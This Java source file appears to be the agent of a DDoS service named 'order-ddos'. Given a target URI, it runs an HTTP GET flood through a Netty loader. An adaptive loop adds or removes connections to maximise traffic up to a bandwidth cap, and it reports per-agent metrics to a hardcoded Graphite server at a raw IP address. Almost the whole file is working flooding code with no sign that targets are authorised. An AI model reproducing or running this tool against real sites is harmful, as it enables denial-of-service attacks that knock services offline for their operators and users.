package com.orderddos.agent;

import com.codahale.metrics.Histogram;
import com.codahale.metrics.Meter;
import com.codahale.metrics.MetricFilter;
import com.codahale.metrics.MetricRegistry;
import com.codahale.metrics.graphite.Graphite;
import com.codahale.metrics.graphite.GraphiteReporter;
import com.orderddos.network.LoadStatistics;
import com.orderddos.network.decisions.ChangeAmountOfConnections;
import com.orderddos.network.decisions.Decision;
import com.orderddos.network.netty.HttpGetNettyNetworkLoader;
import org.javatuples.Pair;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetSocketAddress;
import java.util.Objects;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class OrderDDoSAgent {

    private static final Logger log = LoggerFactory.getLogger(OrderDDoSAgent.class);

    private static final String CARBON_HOST = "104.248.203.116";
    private static final Integer CARBON_PORT = 2005;
    private static final Long GBIT = 134217728L; // 2^27

    public static void main(String[] args) throws Exception {
        UUID uuid = UUID.fromString(args[0]);
        String uri = args[1];
        log.info(String.format("UUID: %s URI: %s", uuid.toString(), uri));
        MetricRegistry metricRegistry = new MetricRegistry();
        initReporters(metricRegistry);
        runLoad(uuid, uri, metricRegistry);
    }

    private static void runLoad(UUID uuid, String uri, MetricRegistry metricRegistry) throws Exception {
        Meter succeedRequestsPerSecond = metricRegistry.meter(String.format("requests.succeeded.%s", uuid.toString()));
        Meter failedRequestsPerSecond = metricRegistry.meter(String.format("requests.failed.%s", uuid.toString()));
        Meter bytesReadPerSecond = metricRegistry.meter(String.format("bytes.read.%s", uuid.toString()));
        Meter bytesWrittenPerSecond = metricRegistry.meter(String.format("bytes.written.%s", uuid.toString()));
        Meter traffic = metricRegistry.meter(String.format("bytes.traffic.%s", uuid.toString()));
        Histogram histogram = metricRegistry.histogram("request.time");

        // Pair of connections and traffic
        AtomicReference<Pair<Long, Long>> bestResult = new AtomicReference<>(null);

        Random random = new Random();
        HttpGetNettyNetworkLoader httpGetNettyNetworkLoader = new HttpGetNettyNetworkLoader();
        httpGetNettyNetworkLoader.loadAddress(uri, loadStatistics -> {
            LoadStatistics lastStat = loadStatistics.pollLast();
            Objects.requireNonNull(lastStat);
            bytesReadPerSecond.mark(lastStat.getBytesRead());
            updateBestResult(lastStat, bestResult);
            bytesWrittenPerSecond.mark(lastStat.getBytesWritten());
            long trafficValue = lastStat.getBytesRead() + lastStat.getBytesWritten();
            traffic.mark(trafficValue);
            Decision result;
            if (trafficValue > (GBIT * 0.75)) {
                result = new ChangeAmountOfConnections(0);
            } else {
                if (lastStat.getConnectionsCount() == 0) {
                    // start with 100 connections
                    result = new ChangeAmountOfConnections(100);
                } else if (trafficValue < bestResult.get().getValue1()) {
                    if (Math.random() < 0.5 && lastStat.getConnectionsCount() >= 100) {
                        result = new ChangeAmountOfConnections(-50);
                    } else {
                        result = new ChangeAmountOfConnections(25 + random.nextInt(25));
                    }
                } else {
                    // we've got new result
                    result = new ChangeAmountOfConnections(0);
                }
            }
            updateBestResult(lastStat, bestResult);
            return result;
        }, event -> succeedRequestsPerSecond.mark(), event -> failedRequestsPerSecond.mark(), histogram::update);
    }

    private static void updateBestResult(LoadStatistics lastStat, AtomicReference<Pair<Long, Long>> bestResult) {
        long trafficValue = lastStat.getBytesRead() + lastStat.getBytesWritten();
        long connectionsCount = lastStat.getConnectionsCount();
        if (bestResult.get() == null || bestResult.get().getValue1() < trafficValue) {
            bestResult.set(new Pair<>(connectionsCount, trafficValue));
            log.info("New best traffic value: '{}'. Connections: '{}'", LoadStatistics.humanReadableByteCount(trafficValue, true), connectionsCount);
        }
    }

    private static void initReporters(MetricRegistry metricRegistry) {
        Graphite graphite = new Graphite(new InetSocketAddress(CARBON_HOST, CARBON_PORT));
        final GraphiteReporter reporter = GraphiteReporter.forRegistry(metricRegistry)
                .prefixedWith("order-ddos.com")
                .convertRatesTo(TimeUnit.SECONDS)
                .convertDurationsTo(TimeUnit.MILLISECONDS)
                .filter(MetricFilter.ALL)
                .build(graphite);
        reporter.start(1, TimeUnit.SECONDS);
//        ConsoleReporter consoleReporter = ConsoleReporter.forRegistry(metricRegistry)
//                .convertRatesTo(TimeUnit.SECONDS)
//                .convertDurationsTo(TimeUnit.MILLISECONDS)
//                .build();
//        consoleReporter.start(1, TimeUnit.SECONDS);
    }
}
